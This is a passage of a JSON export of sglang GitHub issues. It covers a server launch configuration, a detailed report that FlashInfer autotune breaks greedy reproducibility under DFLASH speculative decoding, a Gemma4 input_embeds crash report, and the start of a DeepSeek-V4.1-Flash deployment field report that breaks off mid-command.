                  GPU Memory |\n|        ID   ID                                                               Usage      |\n|=========================================================================================|\n|    0   N/A  N/A         3607733      C   /opt/sglang/bin/python                  380MiB |\n|    0   N/A  N/A         3609506      C   sglang::scheduler_TP0_EP0             12731... |\n|    1   N/A  N/A         3609672      C   sglang::scheduler_TP1_EP1             12741... |\n|    2   N/A  N/A         3609844      C   sglang::scheduler_TP2_EP2             12741... |\n|    3   N/A  N/A         3610037      C   sglang::scheduler_TP3_EP3             12741... |\n|    4   N/A  N/A         3610221      C   sglang::scheduler_TP4_EP4             12741... |\n|    5   N/A  N/A         3610400      C   sglang::scheduler_TP5_EP5             12741... |\n|    6   N/A  N/A         3610578      C   sglang::scheduler_TP6_EP6             12741... |\n|    7   N/A  N/A         3610783      C   sglang::scheduler_TP7_EP7             12693... |\n+-----------------------------------------------------------------------------------------+\n# 启动脚本\ndocker run -d --name GLM-5.3-Flash --gpus all \\\n  --shm-size 32g \\\n  -p 30003:30000 \\\n  -v /data/nfs_share/GLM-5.3-Flash:/data/nfs_share/GLM-5.3-Flash \\\n  -v /data/sglang_cache:/root/.cache/sglang \\\n  -e SGLANG_CACHE_DIR=/root/.cache/sglang \\\n  -e SGLANG_DG_CACHE_DIR=/root/.cache/sglang/deep_gemm \\\n  -e DG_JIT_CACHE_DIR=/root/.cache/sglang/deep_gemm \\\n  -e TILELANG_CACHE_DIR=/root/.cache/sglang/tilelang \\\n  -e TRITON_CACHE_DIR=/root/.cache/sglang/triton \\\n  -e TORCHINDUCTOR_CACHE_DIR=/root/.cache/sglang/inductor \\\n  -e CUDA_CACHE_PATH=/root/.cache/sglang/nv \\\n  -e FLASHINFER_WORKSPACE_BASE=/root/.cache/sglang \\\n  --ipc=host \\\n  lmsysorg/sglang:latest \\\n  sglang serve \\\n    --served-model-name GLM-5.3-Flash \\\n    --model-path /data/nfs_share/GLM-5.3-Flash \\\n    --tp-size 8 \\\n    --ep-size 8 \\\n    --mem-fraction-static 0.75 \\\n    --context-length 1048576 \\\n    --dsa-prefill-backend tilelang \\\n    --dsa-decode-backend tilelang \\\n    --kv-cache-dtype bfloat16 \\\n    --moe-runner-backend deep_gemm \\\n    --speculative-algorithm EAGLE \\\n    --speculative-num-steps 5 \\\n    --speculative-eagle-topk 1 \\\n    --speculative-num-draft-tokens 6 \\\n    --host 0.0.0.0 \\\n    --port 30000 \\\n    --cuda-graph-backend-prefill breakable \\\n    --enable-hierarchical-cache \\\n    --hicache-size 100 \\\n    --reasoning-parser auto \\\n    --tool-call-parser auto \\\n    --max-running-requests 32 \\\n    --enable-metrics \\\n    --enable-cache-report\n\n\n### Environment\n\nroot@4d375604dbcb:/sgl-workspace/sglang# python3 -m sglang.check_env\nPython: 3.12.15 (main, Oct  3 2026, 01:03:07) [Clang 22.1.3 ]\nCUDA available: True\nGPU 0,1,2,3,4,5,6,7: NVIDIA H20-3e\nGPU 0,1,2,3,4,5,6,7 Compute Capability: 9.0\nCUDA_HOME: /usr/local/cuda\nNVCC: Cuda compilation tools, release 13.0, V13.0.88\nCUDA Driver Version: 595.45.04\nPyTorch: 2.14.1+cu130\nsglang: 0.0.0.dev1+g7760d5264\nsglang-kernel: 0.4.9\nflashinfer_python: 0.7.0.post1\nflashinfer_cubin: 0.7.0.post1\nflashinfer_jit_cache: 0.7.0.post1+cu130\ntriton: 3.8.0\ntransformers: 5.19.0\ntorchao: Module Not Found\nnumpy: 2.3.5\naiohttp: 3.14.4\nfastapi: 0.142.4\nhuggingface_hub: 1.33.0\ninteregular: 0.3.3\nmodelscope: 1.40.1\norjson: 3.13.0\noutlines: 0.1.11\npackaging: 26.3\npsutil: 7.2.2\npydantic: 2.13.5\npython-multipart: 0.0.32\npyzmq: 27.2.0\nuvicorn: 0.54.0\nuvloop: 0.23.0\nvllm: Module Not Found\nxgrammar: 0.2.7\nopenai: 2.6.1\ntiktoken: 0.14.0\nanthropic: 1.12.0\nlitellm: Module Not Found\ntorchcodec: 0.17.0+cu130\nNVIDIA Topology: \n        GPU0    GPU1    GPU2    GPU3    GPU4    GPU5    GPU6    GPU7    NIC0    NIC1    NIC2    NIC3    NIC4    CPU Affinity    NUMA Affinity   GPU NUMA ID\nGPU0     X      NV18    NV18    NV18    NV18    NV18    NV18    NV18    PIX     NODE    SYS     SYS     NODE    0-47,96-143     0               N/A\nGPU1    NV18     X      NV18    NV18    NV18    NV18    NV18    NV18    NODE    NODE    SYS     SYS     NODE    0-47,96-143     0               N/A\nGPU2    NV18    NV18     X      NV18    NV18    NV18    NV18    NV18    NODE    PIX     SYS     SYS     NODE    0-47,96-143     0               N/A\nGPU3    NV18    NV18    NV18     X      NV18    NV18    NV18    NV18    NODE    NODE    SYS     SYS     NODE    0-47,96-143     0               N/A\nGPU4    NV18    NV18    NV18    NV18     X      NV18    NV18    NV18    SYS     SYS     PIX     NODE    SYS     48-95,144-191   1               N/A\nGPU5    NV18    NV18    NV18    NV18    NV18     X      NV18    NV18    SYS     SYS     NODE    NODE    SYS     48-95,144-191   1               N/A\nGPU6    NV18    NV18    NV18    NV18    NV18    NV18     X      NV18    SYS     SYS     NODE    PIX     SYS     48-95,144-191   1               N/A\nGPU7    NV18    NV18    NV18    NV18    NV18    NV18    NV18     X      SYS     SYS     NODE    NODE    SYS     48-95,144-191   1               N/A\nNIC0    PIX     NODE    NODE    NODE    SYS     SYS     SYS     SYS      X      NODE    SYS     SYS     NODE\nNIC1    NODE    NODE    PIX     NODE    SYS     SYS     SYS     SYS     NODE     X      SYS     SYS     NODE\nNIC2    SYS     SYS     SYS     SYS     PIX     NODE    NODE    NODE    SYS     SYS      X      NODE    SYS\nNIC3    SYS     SYS     SYS     SYS     NODE    NODE    PIX     NODE    SYS     SYS     NODE     X      SYS\nNIC4    NODE    NODE    NODE    NODE    SYS     SYS     SYS     SYS     NODE    NODE    SYS     SYS      X \n\nLegend:\n\n  X    = Self\n  SYS  = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI)\n  NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node\n  PHB  = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU)\n  PXB  = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge)\n  PIX  = Connection traversing at most a single PCIe bridge\n  NV#  = Connection traversing a bonded set of # NVLinks\n\nNIC Legend:\n\n  NIC0: mlx5_2\n  NIC1: mlx5_3\n  NIC2: mlx5_4\n  NIC3: mlx5_5\n  NIC4: mlx5_bond_0\n\n\nulimit soft: 1024","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/43085/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/43085/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/39597","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/39597/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/39597/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/39597/events","html_url":"https://github.com/sgl-project/sglang/issues/39597","id":5460524600,"node_id":"I_kwDOLCAjRs8AAAABRXj-OA","number":39597,"title":"Greedy decoding is not reproducible across server restarts when FlashInfer autotune is enabled (DFLASH speculative decoding)","user":{"login":"fifeek0","id":77527427,"node_id":"MDQ6VXNlcjc3NTI3NDI3","avatar_url":"https://avatars.githubusercontent.com/u/77527427?v=4","gravatar_id":"","url":"https://api.github.com/users/fifeek0","html_url":"https://github.com/fifeek0","followers_url":"https://api.github.com/users/fifeek0/followers","following_url":"https://api.github.com/users/fifeek0/following{/other_user}","gists_url":"https://api.github.com/users/fifeek0/gists{/gist_id}","starred_url":"https://api.github.com/users/fifeek0/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/fifeek0/subscriptions","organizations_url":"https://api.github.com/users/fifeek0/orgs","repos_url":"https://api.github.com/users/fifeek0/repos","events_url":"https://api.github.com/users/fifeek0/events{/privacy}","received_events_url":"https://api.github.com/users/fifeek0/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":2,"created_at":"2026-09-15T10:10:15Z","updated_at":"2026-10-17T19:41:12Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"# Greedy decoding is not reproducible across server restarts when FlashInfer autotune is enabled (DFLASH speculative decoding)\n\n## Summary\n\nWith `temperature=0, top_k=1` (greedy), a DFLASH speculative-decoding server produces **different output text across restarts of the same server process** for the same prompt, even though sampling is deterministic. Starting the server with `--disable-flashinfer-autotune` removes the effect: two independent restarts then produce byte-identical output (8/8 test prompts). A non-speculative (plain autoregressive) server on the same model was reproducible across restarts with autotune either way. We hit this while building a reproducible benchmark for a talk, where identical greedy output across restarts is required.\n\n## Environment\n\n- SGLang: `0.0.0.dev1+g5f55db35e`\n- PyTorch: `2.13.0+cu130`\n- CUDA (torch): `13.0`\n- FlashInfer: `0.6.17`\n- Container image: `lmsysorg/sglang:dev-cu13-qwen38-27b-dflash2` (public; `lmsysorg/sglang@sha256:616a3e97f45191af975896cfa644279096cb31bd408a071c2e99ca7209c3cafe`)\n- GPU: NVIDIA GB10 (Grace Blackwell), `sm121`, 121 GB unified memory\n- Base model: `RadixArk/Qwen3.8-27B-NVFP4` (NVFP4 weights, `--kv-cache-dtype fp8_e4m3`)\n- Draft model: `incoai/Qwen3.8-27B-DFlash2` (canonical; we ran the mirror `z-lab/Qwen3.8-27B-DFlash2` at revision `50307d4c4cde6860d4eee73e2547cd786fe8e8a4`), `--speculative-algorithm DFLASH`, `--speculative-num-draft-tokens 8`\n\n## Reproduction\n\nGreedy, identical requests. `enable_thinking=false` keeps output bounded (this base model is a reasoning model); the effect does not depend on it. Warm up once after each start, because the first full generation after a start is transient (a separate effect) — the warmup isolates the restart effect.\n\nA self-contained script (no external repo, one built-in prompt) is below. It starts the server, warms up, generates, hashes, restarts, repeats, and compares.\n\n<details>\n<summary><code>repro_autotune.py</code> — starts server, restarts, compares greedy output</summary>\n\n```python\n#!/usr/bin/env python3\n# Reproduce: greedy output differs across sglang restarts with FlashInfer autotune ON.\n#   python3 repro_autotune.py                 # autotune ON  -> expect DIFFERENT\n#   python3 repro_autotune.py --autotune-off  # autotune OFF -> expect IDENTICAL\n#\n# Defaults use our exact setup (needs a Blackwell GPU for the NVFP4 weights). To test\n# the hypothesis on commodity hardware (e.g. H100/A100) with a standard model and a\n# different speculative algorithm, override via env, for example:\n#   MODEL=meta-llama/Meta-Llama-3.1-8B-Instruct SPEC_ALGO=EAGLE \\\n#   DRAFT=yuhuili/EAGLE-LLaMA3.1-Instruct-8B NUM_DRAFT=8 python3 repro_autotune.py\n# For algorithms that need no separate draft model, leave DRAFT empty.\nimport subprocess, sys, time, json, hashlib, urllib.request, os\n\nMODEL     = os.environ.get(\"MODEL\", \"RadixArk/Qwen3.8-27B-NVFP4\")\nSPEC_ALGO = os.environ.get(\"SPEC_ALGO\", \"DFLASH\")\nDRAFT     = os.environ.get(\"DRAFT\", \"incoai/Qwen3.8-27B-DFlash2\")  # we verified with mirror z-lab/Qwen3.8-27B-DFlash2 @ 50307d4c\nDRAFT_REV = os.environ.get(\"DRAFT_REV\", \"\")                        # optional pin\nNUM_DRAFT = os.environ.get(\"NUM_DRAFT\", \"8\")\nPORT      = int(os.environ.get(\"PORT\", \"30000\"))\nAUTOTUNE_OFF = \"--autotune-off\" in sys.argv\nURL = f\"http://127.0.0.1:{PORT}\"\nPROMPT = (\"Write a Python function word_count(text) that returns a dictionary mapping each \"\n          \"word to its count, case-insensitive and ignoring punctuation. Include a docstring \"\n          \"and type hints. Code only.\")\n\ndef start():\n    cmd = [\"python3\",\"-m\",\"sglang.launch_server\",\n           \"--model-path\",MODEL,\"--served-model-name\",\"repro\",\"--trust-remote-code\",\n           \"--speculative-algorithm\",SPEC_ALGO,\n           \"--speculative-num-draft-tokens\",NUM_DRAFT,\n           \"--host\",\"127.0.0.1\",\"--port\",str(PORT)]\n    if DRAFT:\n        cmd += [\"--speculative-draft-model-path\",DRAFT]\n        if DRAFT_REV:\n            cmd += [\"--speculative-draft-model-revision\",DRAFT_REV]\n    if AUTOTUNE_OFF:\n        cmd.append(\"--disable-flashinfer-autotune\")\n    p = subprocess.Popen(cmd, stdout=open(\"/tmp/sgl_repro.log\",\"w\"), stderr=subprocess.STDOUT)\n    for _ in range(300):\n        try:\n            urllib.request.urlopen(URL+\"/health\", timeout=3); return p\n        except Exception:\n            time.sleep(5)\n    p.terminate(); sys.exit(\"server did not become healthy; see /tmp/sgl_repro.log\")\n\ndef stop(p):\n    p.terminate()\n    try: p.wait(timeout=60)\n    except Exception: p.kill()\n    time.sleep(3)\n\ndef gen():\n    body = json.dumps({\"model\":\"repro\",\"messages\":[{\"role\":\"user\",\"content\":PROMPT}],\n        \"temperature\":0,\"top_k\":1,\"max_tokens\":320,\n        \"chat_template_kwargs\":{\"enable_thinking\":False}}).encode()\n    req = urllib.request.Request(URL+\"/v1/chat/completions\", data=body,\n                                 headers={\"Content-Type\":\"application/json\"})\n    j = json.load(urllib.request.urlopen(req, timeout=300))\n    t = j[\"choices\"][0][\"message\"][\"content\"] or \"\"\n    return hashlib.sha256(t.encode()).hexdigest()[:16], j[\"usage\"][\"completion_tokens\"]\n\ndef run_once():\n    p = start()\n    gen()          # warmup (settle the transient first generation)\n    h, n = gen()   # record\n    stop(p)\n    return h, n\n\nprint(f\"autotune {'OFF' if AUTOTUNE_OFF else 'ON'}: two restarts, greedy (temp=0, top_k=1)\")\nh1, n1 = run_once(); print(f\"  restart 1: sha256={h1} tokens={n1}\")\nh2, n2 = run_once(); print(f\"  restart 2: sha256={h2} tokens={n2}\")\nprint(\"RESULT:\", \"IDENTICAL\" if h1==h2 else \"DIFFERENT\",\n      \"-- expected DIFFERENT with autotune ON, IDENTICAL with --autotune-off\")\n```\n\n</details>\n\nEquivalent manual steps: start the server; warm up (one discarded request); record `sha256(choices[0].message.content)` and `usage.completion_tokens`; stop and restart with the identical command; warm up and record again; compare. Then repeat with `--disable-flashinfer-autotune`.\n\nThe prompts used in the evidence table below:\n\n<details>\n<summary>8 evidence prompts</summary>\n\n```\nword_count : Write a Python function word_count(text) that returns a dictionary mapping each word to its count, case-insensitive and ignoring punctuation. Include a docstring and type hints. Code only.\nhashmap    : Explain what a hash map is in exactly 3 sentences.\nunit-tests : List 5 benefits of unit testing, one line each.\ntcp        : Describe the TCP three-way handshake in 4 sentences.\nproc-thread: What is the difference between a process and a thread? 3 sentences.\ncap        : Summarize the CAP theorem in 3 sentences.\nfibonacci  : Write a Python function returning the nth Fibonacci number iteratively, with a docstring. Code only.\n```\n\n`pomodoro` (the long-generation prompt) in full:\n\n```\nCreate a single, self-contained HTML file for a Pomodoro focus timer. All CSS and JavaScript inline — no libraries, no CDN links, no images.\n\nRequirements:\n- A circular SVG countdown ring that depletes as time passes (stroke-dashoffset).\n- Three mode buttons: Focus (25 min), Short Break (5 min), Long Break (15 min); highlight the active one.\n- Big MM:SS display centered in the ring.\n- Start / Pause and Reset buttons.\n- A completed-focus-sessions counter that increments each time a Focus session reaches zero.\n- A short beep via the Web Audio API when the timer reaches zero (no audio files).\n- Modern dark UI, one accent color, centered layout, rounded corners, smooth transitions.\n\nWrite compact code: no comments, concise CSS (group selectors, short values). Keep the file under 110 lines.\n\nOutput ONLY the complete HTML file, starting with <!DOCTYPE html>. Nothing before or after the code.\n```\n\n</details>\n\n## Expected vs actual\n\n- Expected: with greedy sampling, the same prompt yields identical output across restarts.\n- Actual (autotune enabled): different text and, frequently, a different number of generated tokens across restarts.\n\n## Evidence\n\nEach experiment = two independent restarts, warm, same 8 prompts, greedy.\n\n### Experiment 1 - autotune ENABLED, `--random-seed 42` pinned on both starts\n\nPer-prompt `sha256[:12]` (restart 1 vs restart 2):\n\n| prompt      | restart 1                 | restart 2                 |\n|-------------|---------------------------|---------------------------|\n| word_count  | `a1309947d12e` (181 tok)  | `5ab0a01bcffd` (184 tok)  |\n| pomodoro    | `70ba72fe717a` (1381 tok) | `ca99fa9bf5cb` (1236 tok) |\n| hashmap     | `7b3a5251f97c` (67)       | `c2c514c51143` (70)       |\n| unit-tests  | `c14dfe8832c3` (101)      | `b73a3b51e0c8` (129)      |\n| tcp         | `33f1f9128026` (98)       | `392a9a3af403` (82)       |\n| proc-thread | `e5ad6a67dcdd` (97)       | `c5ec14b4e046` (94)       |\n| cap         | `fdc76849eff4` (72)       | `aa32a00b8bd9` (70)       |\n| fibonacci   | `d3d1812f29fe` (209)      | `d3d1812f29fe` (209)      |\n\n7/8 prompts differ across the two restarts; only `fibonacci` matched. The seed is pinned to the same value on both starts, so this is not a sampling-seed effect. Example of a token-count difference: 1381 vs 1236.\n\nToken-level first divergence for `word_count` between two autotune-enabled restarts (a separate autotune-ON run pair from the seed-pinned table above; 181 vs 158 tokens): first differing token at **index 43**:\n\n```\nshared context: ... each word in the given text.\\n\\n    The\nrestart 1:  function is case-insensitive and ignores punctuation. Words\nrestart 2:  counting is case-insensitive and ignores punctuation.\\n\n```\n\nThis is an early argmax flip (token 43 of ~180), not a truncation artifact.\n\n### Experiment 2 - autotune DISABLED (`--disable-flashinfer-autotune`), two restarts\n\nAll 8 prompts identical across restarts (`sha256[:12]`):\n\n```\nword_count  bb92924fc6e6\npomodoro    70ba72fe717a\nhashmap     7b3a5251f97c\nunit-tests  a1e0272c7edd\ntcp         a05397b13fa6\nproc-thread e5ad6a67dcdd\ncap         630d977d8e0f\nfibonacci   d3d1812f29fe\n```\n\n8/8 identical between the two autotune-disabled restarts.\n\nNote: four hashes coincide between Experiment 2 and Experiment 1 / restart 1 (`pomodoro`, `hashmap`, `proc-thread`, `fibonacci`). This is expected, not a copy error: for those prompts that particular autotune-enabled run happened to select kernels numerically equivalent to the default (autotune-off) path; for the other four it did not. The autotune-off hashes are the stable reference; autotune-enabled runs coincide with them only sometimes.\n\n### Control - non-speculative baseline, autotune ENABLED, two restarts\n\nSame base model and flags, without the `--speculative-*` block. `sha256[:12]`, restart 1 vs restart 2:\n\n| prompt      | restart 1              | restart 2              |\n|-------------|------------------------|------------------------|\n| word_count  | `eaaaafd3bc77` (161)   | `eaaaafd3bc77` (161)   |\n| pomodoro    | `4a675495c5a2` (1289)  | `4a675495c5a2` (1289)  |\n| hashmap     | `7b3a5251f97c` (67)    | `7b3a5251f97c` (67)    |\n| unit-tests  | `bf81f7e6d66d` (123)   | `bf81f7e6d66d` (123)   |\n| tcp         | `825395560462` (96)    | `825395560462` (96)    |\n| proc-thread | `75a8cd2c22a9` (94)    | `75a8cd2c22a9` (94)    |\n| cap         | `bd35ac80b11e` (72)    | `bd35ac80b11e` (72)    |\n| fibonacci   | `d3d1812f29fe` (209)   | `d3d1812f29fe` (209)   |\n\n8/8 identical. With autotune enabled, the plain autoregressive path is reproducible across restarts; only the DFLASH speculative path is not, in our tests.\n\nHypothesis for why only the speculative path is affected (not confirmed in source): the DFLASH path adds tensor shapes that plain decoding does not (the draft model plus the block-verify geometry), so autotune has more kernel decisions to make and more opportunity to select differently across runs. We have not verified this against the code.\n\nIf that hypothesis holds, the root cause is the number of distinct tensor shapes the speculative path introduces, not DFLASH or NVFP4 specifically. In that case the effect should reproduce with **any speculative algorithm (e.g. EAGLE, MTP) and a standard model on any GPU** — it would not need Blackwell/NVFP4 or the DFlash2 draft (which exists only for this one model, so the exact setup above cannot be run on H100/A100). We could not test this ourselves (we have no other hardware or setup). For anyone with a commodity GPU this is likely the cheapest verification: run the script above with `MODEL` / `SPEC_ALGO` / `DRAFT` set to a standard EAGLE- or MTP-capable configuration. This is a suggestion, not a claim — we have not confirmed it reproduces outside our setup.\n\n## Diagnosis (what we ruled out)\n\n- `--random-seed`: excluded. At `temperature=0, top_k=1` there is no sampling for the seed to affect; verified empirically (Experiment 1 pins `--random-seed 42` on both restarts and still diverges 7/8).\n- `--kv-cache-dtype`: the effect reproduces with both `fp8_e4m3` and `auto` (bf16), so KV cache dtype is not the cause.\n- Speculative block length (`--speculative-num-draft-tokens`): varying it changes which prompts diverge but does not remove the divergence.\n- `--disable-flashinfer-autotune`: makes the output identical across restarts (8/8), and the non-speculative baseline is reproducible regardless.\n\nObservation (hypothesis, not confirmed in source): FlashInfer autotune appears to select kernels per process start via micro-benchmark timing, and its autotune cache directory (`/root/.cache/sglang/flashinfer/autotune/<version>/sm121/...`) is not persisted across container restarts, so each start re-runs autotune and can pick different kernels, giving slightly different numerics that flip token choices under greedy. We have not verified the kernel-selection mechanism in the SGLang/FlashInfer source; this is inferred from the observed behavior and the effect of the flag.\n\n## Performance impact of the workaround\n\nDecode throughput on the speculative server, autotune enabled vs disabled, greedy, warm (median of 5):\n\n- Short code prompt (~180 tok): 60.4 -> 57.9 tok/s (about -4%)\n- Longer HTML prompt (~1.3k tok): 45.1 -> 45.6 tok/s (no measurable change)\n\n## Question for maintainers\n\nWe are not attached to a specific fix and do not know the internal constraints. Is any of these feasible / preferable:\n\n- persisting the FlashInfer autotune cache across process restarts (so kernel selection is stable), or\n- a flag to force deterministic kernel selection while keeping autotune, or\n- documenting that FlashInfer autotune breaks cross-restart reproducibility under greedy, so users who need reproducible outputs know to disable it?\n\nThis was observed only on GB10 / `sm121`, which is uncommon hardware. Our exact base+draft models cannot run on H100/A100 (NVFP4/Blackwell, and the DFlash2 draft exists only for this model), so a check there would use the standard-model + EAGLE/MTP path described in the Control section. A repro (or non-repro) on commodity hardware would help scope whether this is hardware- or setup-specific. Happy to run additional diagnostics on this hardware.\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/39597/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/39597/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44895","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/44895/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/44895/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/44895/events","html_url":"https://github.com/sgl-project/sglang/issues/44895","id":5898515212,"node_id":"I_kwDOLCAjRs8AAAABX5QzDA","number":44895,"title":"[Bug] Gemma4 input_embeds request crashes target prefill with input_ids/inputs_embeds exclusivity error","user":{"login":"riversky0014","id":10959535,"node_id":"MDQ6VXNlcjEwOTU5NTM1","avatar_url":"https://avatars.githubusercontent.com/u/10959535?v=4","gravatar_id":"","url":"https://api.github.com/users/riversky0014","html_url":"https://github.com/riversky0014","followers_url":"https://api.github.com/users/riversky0014/followers","following_url":"https://api.github.com/users/riversky0014/following{/other_user}","gists_url":"https://api.github.com/users/riversky0014/gists{/gist_id}","starred_url":"https://api.github.com/users/riversky0014/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/riversky0014/subscriptions","organizations_url":"https://api.github.com/users/riversky0014/orgs","repos_url":"https://api.github.com/users/riversky0014/repos","events_url":"https://api.github.com/users/riversky0014/events{/privacy}","received_events_url":"https://api.github.com/users/riversky0014/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":2,"created_at":"2026-10-17T12:52:20Z","updated_at":"2026-10-17T16:38:44Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Observed behavior\n\nA `/generate` request containing only `input_embeds` crashes Gemma4 target prefill with:\n\n```text\nFile \"python/sglang/srt/models/gemma4_mm.py\", line 657, in forward\n    raise ValueError(...)\nValueError: You must specify exactly one of input_ids or inputs_embeds\n```\n\nThe request itself does not supply `input_ids`. In the inspected source, the eager forward passes `forward_batch.input_ids` together with `forward_batch.input_embeds` to the multimodal model, which rejects the combination. The scheduler subsequently exits with SIGQUIT.\n\n### Reproduction from the recorded run\n\nSet `MODEL_PATH` and `DRAFT_MODEL_PATH` to local Gemma-4-12B-it and assistant checkpoints. The tested launch configuration was:\n\n```bash\npython -m sglang.launch_server --model-path ${MODEL_PATH} --attention-backend triton --dtype bfloat16 --tp-size 1 --max-total-tokens 65536 --swa-full-tokens-ratio 0.28125 --mem-fraction-static 0.90 --max-running-requests 32 --cuda-graph-bs-decode 1 8 32 --context-length 4352 --chunked-prefill-size 2048 --decode-log-interval 4 --random-seed 20261013 --enable-streaming-session --disable-radix-cache --port 30138 --host 127.0.0.1 --return-output-ids --skip-server-warmup --speculative-algorithm NEXTN --speculative-draft-model-path ${DRAFT_MODEL_PATH} --speculative-num-steps 2 --speculative-eagle-topk 1 --speculative-num-draft-tokens 3\n```\n\nThen send:\n\n```python\nimport json\nimport os\nfrom pathlib import Path\nimport requests\n\ncfg = json.loads((Path(os.environ[\"MODEL_PATH\"]) / \"config.json\").read_text())\nhidden = cfg.get(\"text_config\", cfg)[\"hidden_size\"]\nresponse = requests.post(\"http://127.0.0.1:30138/generate\", json={\n    \"input_embeds\": [[0.0] * hidden] * 2,\n    \"sampling_params\": {\n        \"temperature\": 0, \"max_new_tokens\": 32, \"ignore_eos\": True,\n    },\n}, timeout=120)\nprint(response.status_code, response.text)\n```\n\n`--disable-radix-cache` was enabled as required by the embedding-input API. Regular/streaming session and image requests completed earlier in the same server session.\n\n### Environment and scope of evidence\n\n- One NVIDIA H20, BF16, TP=1, Triton attention; measured on 2026-10-17.\n- Local pinned performance source `6617819a1ace51701e9044ab7f235dd4113a9fdf`, based on `bd7bf225c23c2ba8143be082944b4bf67a0f1a6a`. This includes local CUDA verify work; this is **not** a claim that the repro was rerun on current upstream main.\n- Observed on two independent servers, both with and without the opt-in no-host-sum optimization proposed in #44894. Failure happens in target prefill before the draft helper is reached. The helper's embedding guard is therefore unrelated to this crash.\n- The command above is the recorded configuration with local paths replaced. A smaller launch configuration and ordinary decode without NEXTN have not yet been tested.\n\n### Expected behavior\n\nAn embedding-only request should reach the model with exactly one embedding/input-ID representation. If Gemma4 does not support this API, reject the request clearly at validation time rather than crashing the scheduler.\n","reactions":{"url":"https://api.github.com/repos/sgl-project/sglang/issues/44895/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/sgl-project/sglang/issues/44895/timeline","performed_via_github_app":null,"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/sgl-project/sglang/issues/40877","repository_url":"https://api.github.com/repos/sgl-project/sglang","labels_url":"https://api.github.com/repos/sgl-project/sglang/issues/40877/labels{/name}","comments_url":"https://api.github.com/repos/sgl-project/sglang/issues/40877/comments","events_url":"https://api.github.com/repos/sgl-project/sglang/issues/40877/events","html_url":"https://github.com/sgl-project/sglang/issues/40877","id":5550619948,"node_id":"I_kwDOLCAjRs8AAAABSte9LA","number":40877,"title":"[SM120] Field report: DeepSeek-V4.1-Flash in production on 8x RTX PRO 6000 (PCIe, no NVLink) - working config, measured throughput, rejected topologies","user":{"login":"Lei-010","id":231609221,"node_id":"U_kgDODc4ThQ","avatar_url":"https://avatars.githubusercontent.com/u/231609221?v=4","gravatar_id":"","url":"https://api.github.com/users/Lei-010","html_url":"https://github.com/Lei-010","followers_url":"https://api.github.com/users/Lei-010/followers","following_url":"https://api.github.com/users/Lei-010/following{/other_user}","gists_url":"https://api.github.com/users/Lei-010/gists{/gist_id}","starred_url":"https://api.github.com/users/Lei-010/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/Lei-010/subscriptions","organizations_url":"https://api.github.com/users/Lei-010/orgs","repos_url":"https://api.github.com/users/Lei-010/repos","events_url":"https://api.github.com/users/Lei-010/events{/privacy}","received_events_url":"https://api.github.com/users/Lei-010/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":19,"created_at":"2026-09-23T08:08:28Z","updated_at":"2026-10-17T14:50:25Z","closed_at":null,"assignee":null,"author_association":"NONE","issue_field_values":[],"type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"## Summary\n\nField data from running **DeepSeek-V4.1-Flash** as a production SGLang backend on **8× RTX PRO 6000 Blackwell Max-Q (SM120, 96 GB, PCIe-only — no NVLink)**, including the *only* topology we could get to start, measured prefill/decode, a speculative-decoding A/B, and the configuration traps that cost us real experiments. Posting because SM120 + V4.1-Flash users currently have to rediscover all of this from scratch.\n\nFull write-up (with methodology and reproduction artifacts): https://github.com/Lei-010/hermes-agent/blob/main/docs/DeepSeek-V4.1-Flash-SM120-Performance-and-Production-Config.md\n\nRelated: vLLM field report https://github.com/vllm-project/vllm/issues/56700 (same hardware, vLLM side), vLLM https://github.com/vllm-project/vllm/issues/56892 (SM120 bug/perf tracker).\n\n## What works\n\n```bash\ndocker run --gpus all -d --name dsv41 \\\n  --shm-size=64g --ipc=host --network host \\\n  --restart unless-stopped \\\n  -e TP_SIZE=8 -e DP_SIZE=1 -e 